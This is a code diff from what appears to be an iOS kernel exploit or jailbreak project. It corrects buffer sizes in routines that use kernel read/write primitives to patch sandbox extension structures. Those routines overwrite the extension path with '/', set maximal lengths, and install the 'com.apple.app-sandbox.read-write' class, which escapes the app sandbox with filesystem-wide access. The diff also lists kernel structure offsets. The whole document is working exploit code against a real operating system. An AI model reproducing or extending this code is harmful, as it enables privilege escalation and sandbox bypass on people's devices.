@@ -35,11 +35,20 @@
 #include "kexploit/offsets.h"
 #include "kexploit/sandbox.h"
 #include "utils/tweak_log.h"
+#include "utils/state.h"
 
 extern void early_kread(uint64_t where, void *read_buf, size_t size);
 extern int check_sandbox_var_rw(void);
 
-#define KRW_LEN 0x21  // 33 — must fit "com.apple.app-sandbox.read-write" + null
+// The early R/W primitive is hard-limited to EARLY_KRW_LENGTH (32) bytes per
+// transfer — early_kread() FAILUREs on anything larger. The 33-byte class
+// name "com.apple.app-sandbox.read-write\0" is therefore written as two
+// adjacent 32-byte chunks: the 32 name chars at da+32, and the NUL terminator
+// supplied by the zeroed buffer written at da+64. Do NOT bump this past 32.
+#define KRW_LEN EARLY_KRW_LENGTH  // 0x20 — primitive limit
+
+_Static_assert(sizeof("com.apple.app-sandbox.read-write") - 1 == KRW_LEN,
+               "class name must be exactly KRW_LEN chars (no NUL in first chunk)");
 
 // Verified offsets (IDA binary analysis across 6 kernelcaches)
 #define OFF_PROC_PROC_RO       0x18  // proc → proc_ro (stable 17.0-26.x)
@@ -79,11 +88,13 @@ static void patch_ext(uint64_t ext) {
     uint64_t dl = early_kread64(ext + OFF_EXT_DATALEN);
     if (K(da) && dl > 0) {
         uint8_t buf[KRW_LEN];
+        memset(buf, 0, sizeof(buf));
         early_kread(da, buf, KRW_LEN);
         buf[0] = '/'; buf[1] = 0;
         early_kwrite32bytes(da, buf);
     }
     uint64_t __attribute__((aligned(8))) chunk[KRW_LEN / 8];
+    memset(chunk, 0, sizeof(chunk));
     early_kread(ext + OFF_EXT_DATA, chunk, KRW_LEN);
     chunk[1] = 1;
     chunk[2] = 0xFFFFFFFFFFFFFFFFULL;
@@ -108,17 +119,21 @@ static void set_rw_class(uint64_t hdr) {
     uint64_t da = S(early_kread64(ext + OFF_EXT_DATA));
     if (!K(da)) return;
 
+    // "com.apple.app-sandbox.read-write" is exactly 32 chars. The kernel
+    // compares it as a C string, so the NUL must sit adjacent to the name:
+    // b1 (32 chars) lands at da+32, and b2 (all zeros) at da+64 supplies
+    // the terminator. Both writes are 32 bytes — within the primitive limit.
     const char *rw = "com.apple.app-sandbox.read-write";
     uint8_t b1[KRW_LEN], b2[KRW_LEN];
-    memset(b1, 0, KRW_LEN); memset(b2, 0, KRW_LEN);
-    memcpy(b1, rw, KRW_LEN);
-    b1[KRW_LEN - 1] = '\0';
+    memset(b1, 0, sizeof(b1)); memset(b2, 0, sizeof(b2));
+    memcpy(b1, rw, strlen(rw));
     early_kwrite32bytes(da + 32, b1);
     early_kwrite32bytes(da + 64, b2);
 
-    uint8_t hb[KRW_LEN];
+    uint64_t __attribute__((aligned(8))) hb[KRW_LEN / 8];
+    memset(hb, 0, sizeof(hb));
     early_kread(hdr, hb, KRW_LEN);
-    *(uint64_t*)(hb + 0x10) = da + 32;
+    hb[0x10 / 8] = da + 32;
     early_kwrite32bytes(hdr, hb);
 }
 
